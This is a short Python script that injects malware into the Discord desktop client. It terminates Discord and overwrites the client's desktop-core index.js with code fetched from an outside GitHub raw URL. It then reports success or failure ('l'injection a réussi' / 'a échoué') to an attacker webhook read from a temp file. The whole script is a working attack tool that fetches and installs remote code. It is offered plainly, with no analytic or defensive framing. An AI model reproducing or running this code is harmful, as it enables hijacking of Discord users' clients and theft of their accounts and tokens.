import os
import psutil
import requests
import time
from pathlib import Path

def close_discord():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'].lower() == 'discord.exe':
            try:
                proc.terminate()
                proc.wait()
            except psutil.NoSuchProcess:
                pass

def get_discord_path():
    appdata_path = os.getenv('LOCALAPPDATA')
    discord_path = os.path.join(appdata_path, 'Discord', 'app-1.0.9182', 'modules', 'discord_desktop_core-1', 'discord_desktop_core', 'index.js')
    
    discord_file = Path(discord_path)
    if discord_file.exists():
        return discord_file.parent
    return None

def send_webhook_message(webhook_url, message):
    payload = {'content': message}
    try:
        response = requests.post(webhook_url, json=payload)
        response.raise_for_status()
    except requests.RequestException:
        pass  

url = "https://raw.githubusercontent.com/reefdzefrfd/nonam/refs/heads/main/index.js"

def download_and_replace_file(url, dest_path):
    try:
        response = requests.get(url)
        response.raise_for_status()
        with open(dest_path, 'wb') as f:
            f.write(response.content)
        return True
    except requests.RequestException:
        return False

discord_folder = get_discord_path()

if discord_folder:
    index_path = discord_folder / "index.js"

    close_discord()

    time.sleep(3)

    webhook_path = os.path.join(os.getenv('TEMP'), 'config', 'webhook.txt')
    if os.path.exists(webhook_path):
        with open(webhook_path, 'r') as file:
            webhook_url = file.read().strip()

        if download_and_replace_file(url, index_path):
            send_webhook_message(webhook_url, "l'injection a reussi avec succès.")
        else:
            send_webhook_message(webhook_url, "l'injection a échoué.")
